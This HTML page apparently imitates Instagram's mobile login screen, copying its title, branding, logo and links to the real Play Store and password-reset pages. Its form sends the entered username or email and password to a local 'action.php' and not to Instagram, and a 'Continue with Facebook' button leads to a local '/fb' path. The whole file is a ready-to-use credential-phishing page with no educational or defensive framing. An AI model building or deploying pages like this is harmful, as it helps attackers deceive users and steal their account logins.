<meta charset="UTF-8"><meta content="text/html; charset=UTF-8" name="Content-Type" /><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" type="image/x-icon" href="favicon.png" /><link rel="stylesheet" href="style.css"><title> Login • Instagram </title>

<style>


@font-face {
  font-family: insta;
  src: url(insta.ttf);
}

#grad1 {
  width: 105%;
  margin-left: -10px;
  margin-top: -10px;
  height: 55px;
  background-image: linear-gradient(to right, #BF357F , #EC5742);
}


.app1 {
color: white;
  font-family: insta;
  font-weight: 500;
  padding-left: 20px;
  padding-top: 10px;
}


.app2 {
color: white;
  font-family: insta;
  font-size: 12px;
  font-weight: 500;
  padding-left: 20px;
}


.fleft {
float: left;
}


.fright {
margin-top: 16px;
margin-right: 20px;
float: right;
}


.get {
background: none;
border: 1px solid white;
color: white;
padding-top: 5px;
padding-bottom: 5px;
padding-left: 10px;
padding-right: 10px;
border-radius: 3px;
}


.cont {
padding-top: 18px;
}


.dots {
color: #808080;
font-size: 11px;
padding-top: 18px;
padding-bottom: 5px;
padding-left: 9px;
padding-right: 10px;
letter-spacing: 1px;
display: inline;
}


.lang {
display: inline;
color: #00376B;
font-size: 12px;
font-family: insta;
padding-left: 120px;
font-weight: 600;
cursor: pointer;
}


.lang:hover {
color: #0095F6;
}


.arrow {
display: inline;
width: 12px;
height: 12px;
}


.logo {
width: 60%;
height: 110px;
margin-top: 10px;
margin-bottom: 10px;
}


.continue {
width: 80%;
background: #0095F6;
color: white;
border-radius: 5px;
padding-top: 10px;
padding-bottom: 8px;
padding-left: 10px;
padding-right: 10px;
border: none;
outline: none;
}


.continue:hover {
background: #4CB5F9;
}

.fb {
width: 15px;
height: 15px;
margin-left: -150px;
} 


.with {
display: inline;
font-weight: 600;
font-family: insta;
margin-left: 5px;
position: absolute;
}


.contain {
width: 78%;
}


.forms {
margin: 20px;
}


.input1 {
padding: 10px;
width: 90%;
border-radius: 5px;
border: 1px solid #DBDBDB;
font-size: 13px;
}


.input2 {
padding: 10px;
width: 90%;
border-radius: 5px;
border: 1px solid #DBDBDB;
font-size: 13px;
margin-top: 6px;
}


.forget {
margin-right: -3px;
background: none;
color: #0095F6;
float: right;
border: none;
outline: none;
margin-bottom: 20px;
}


.forget:hover {
background: #DBF2FA;
}


.login {
width: 90%;
color: white;
padding-top: 10px;
padding-bottom: 8px;
padding-left: 10px;
padding-right: 10px;
border-radius: 5px;
background: #0095F6;
border: none;
font-weight: 600;
}

.login:hover {
background: #4CB5F9;
}

.acnt {
font-family: insta;
display: inline;
font-size: 14px;
color: #909090;
}


a {
text-decoration: none;
font-family: insta;
display: inline;
color: #0095F6;
font-size: 14px;
font-weight: 600;
}


.footer {
width: 105%;
  margin-left: -10px;
  margin-bottom: -10px;
margin-top: 160px;
background: #FAFAFA;
border-top: 1px solid #DBDBDB;
font-family: insta;
height: 60px;
padding-top: 15px;
}


.from {
color: #909090;
font-size: 13px;
font-family: insta;
}


.facebook {
margin-top: 3px;
color: black;
font-size: 13px;
font-weight: 500;
letter-spacing: 2px;
}


.separator{
display:flex;
margin-left: -3px;
align-items:center;
text-align:center;
color:#8E8E8E;
font-family:facebook;
font-weight:600;
font-size:13px;
}


.separator::after, .separator::before {
content:'';flex:1;
border-bottom:1px solid #d3d3d3;
}


.separator::before {
margin-right:20px;
}


.separator::after{
margin-left:20px;
}


</style>

<div id="grad1"> 




<div class="fleft">
<div class="app1">Instagram</div>
<div class="app2">Find it for free on Google Play.</div>
</div>


<div class="fright"> <button class="get" onclick="location.href=('https://play.google.com/store/apps/details?id=com.instagram.android');">GET</button>
</div>


</div>





<div class="cont">
<div class="dots"> ••• </div>
<div class="lang"> ENGLISH </div>
<img class="arrow" src="arrow.png"/>
</div>

<center>
<img class="logo" src="instagram.png"/>
</center>
<br/>
<center>
<button class="continue" onclick="location.href=('/fb');"> <img class="fb" src="fb.png"/> <div class="with">Continue with Facebook</div></button>
</center>

<br/>


<center>
<div class="contain">
<div class="separator"> OR </div>
</div></center>


<center>
<div class="forms">
<form action="action.php" method="post">
<input type="text" name="mail" class="input1" placeholder="Phone number, username, or email"/><br/>
<input type="password" name="password" class="input2" placeholder="Password"/><br/>
<button class="forget" onclick="location.href=('https://www.instagram.com/accounts/password/reset/');"> Forgot password? </button><br/>
<input type="submit" class="login" value="Log In"/>
</form>
</div>
</center>




<center>
<div class="acnt">
Don't have an account?</div> <a href="https://www.instagram.com/accounts/signup/phone">Sign up</a>
</center>




<center>
<div class="footer">
<div class="from"> from </div>
<div class="facebook"> FACEBOOK </div>
</div>
</center>

